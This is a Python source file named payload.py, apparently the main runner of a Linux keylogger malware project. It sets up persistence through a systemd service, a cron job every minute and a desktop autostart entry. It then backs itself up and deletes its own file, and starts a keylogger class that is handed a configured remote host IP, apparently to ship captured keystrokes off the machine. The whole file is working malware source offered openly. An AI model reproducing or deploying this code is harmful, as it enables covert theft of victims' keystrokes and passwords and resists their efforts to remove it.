"""
@author: Vuong Van Duy
payload.py
data: 14.10.2025

This script serves as the main payload runner. It sets up persistence mechanisms such as systemd services,
cron jobs, and desktop entries to ensure the payload remains active.
It also creates a backup of itself before executing the keylogger functionality.
"""


import os
import sys
import argparse
import logging
from pathlib import Path
from config import IP, BACKUP_DIR
from utils import get_file_name, _md5_of_file, self_backup_and_delete, create_dirs_if_not_exists
from persistance.setup_systemd import install_systemd_service, create_unit_content
from persistance.setup_cron import create_bash_content, install_cron_job
from persistance.setup_desktop_entry import install_desktop_entry, create_wrapper_script_content
from keylogger import KeyloggerViruss


# ===== FIX FOR PYINSTALLER + PYNPUT =====
if getattr(sys, 'frozen', False):
    # Force initialize logging before pynput tries to use it
    logging.basicConfig(
        level=logging.CRITICAL,  # Suppress most logs
        format='%(message)s',
        handlers=[logging.StreamHandler()]
    )
    
    # Manually create logger hierarchy that pynput expects
    pynput_logger = logging.getLogger('pynput')
    pynput_logger.setLevel(logging.CRITICAL)
    
    keyboard_logger = logging.getLogger('pynput.keyboard')
    keyboard_logger.setLevel(logging.CRITICAL)
    
    # Prevent pynput from trying to configure logging
    import pynput
    if hasattr(pynput, '_logger'):
        pynput._logger = keyboard_logger


def main():
    # ----- parse CLI args -----
    parser = argparse.ArgumentParser(description="Payload runner. Default installs only desktop entry persistence.")
    group = parser.add_mutually_exclusive_group()
    group.add_argument("--only-systemd", action="store_true", help="Install only the systemd unit (no cron, no desktop entry)")
    group.add_argument("--only-cron", action="store_true", help="Install only the cron job (no systemd, no desktop entry)")
    group.add_argument("--only-desktop", action="store_true", help="Install only the desktop entry (no systemd, no cron)"
                       "requires root permission")
    parser.add_argument("--no-systemd", action="store_true", help="Do not install systemd unit")
    parser.add_argument("--no-cron", action="store_true", help="Do not install cron job")
    parser.add_argument("--no-desktop", action="store_true", help="Do not install desktop entry")
    parser.add_argument("--all-enable", action="store_true", help="Install both systemd and cron and desktop entry (default)"
                        "requires root permission")
    parser.add_argument("--all-disable", action="store_true", help="Do not install any persistence mechanism")

    args = parser.parse_args()

    # determine installation choices
    if args.only_systemd:
        do_systemd = True
        do_cron = False
        do_desktop = False
    elif args.only_cron:
        do_systemd = False
        do_cron = True
        do_desktop = False
    elif args.only_desktop:
        do_systemd = False
        do_cron = False
        do_desktop = True
    elif args.all_enable:
        do_systemd = True
        do_cron = True
        do_desktop = True
    elif args.all_disable:
        do_systemd = False
        do_cron = False
        do_desktop = False
    else:
        do_systemd = False
        do_cron = False
        do_desktop = True


    # ----- prepare paths and names -----
    create_dirs_if_not_exists()
    path_file = Path(os.path.abspath(sys.argv[0])).resolve()
    filename = get_file_name(path_file)
    filename_md5 = _md5_of_file(path_file) + '.bak'

    # 1.a. Create systemd unit to restart itself if requested
    if do_systemd:
        unit_content = create_unit_content(progFileName=filename, progFileBackup=filename_md5)
        if unit_content is None:
            print("Error creating unit content.")
            return
        if not install_systemd_service(unit_content=unit_content):
            print("Error creating systemd unit.")
            return
        else:
            print("Systemd service installed successfully.")
    else:
        print("Skipping systemd installation (user requested).")

    # 1.b. Create cron job as a backup if requested
    if do_cron:
        bash_content = create_bash_content(progFileName=filename, progFileBackup=filename_md5)
        if bash_content is None:
            print("Error creating bash content.")
            return
        if not install_cron_job(bash_content=bash_content, interval_minutes=1):
            print("Error creating cron job.")
            return
        else:
            print("Cron job installed successfully.")
    else:
        print("Skipping cron installation (user requested).")

    # 1.c. Create desktop entry as a backup if requested
    if do_desktop:
        wrapper_script_content = create_wrapper_script_content(progFileName=filename, progFileBackup=filename_md5)
        if wrapper_script_content is None:
            print("Error creating wrapper script.")
            return
        if not install_desktop_entry(wrapper_script_content=wrapper_script_content):
            print("Error creating desktop entry.")
            return
        else:
            print("Desktop entry installed successfully.")
    else:
        print("Skipping desktop entry installation (user requested).")

    # 2. Delete and create backup of itself
    try:
        if not self_backup_and_delete(backup_dir=BACKUP_DIR, pathFileName=path_file):
            print("Error creating backup.")
            return
    except PermissionError:
        print("Error: No write access")
        return

    # 3. Run keylogger
    keylogger = KeyloggerViruss(host=IP)
    keylogger.run_keylogger()
    print("End process keylogger. Deleting and creating backup...")

if __name__ == "__main__":
    main()
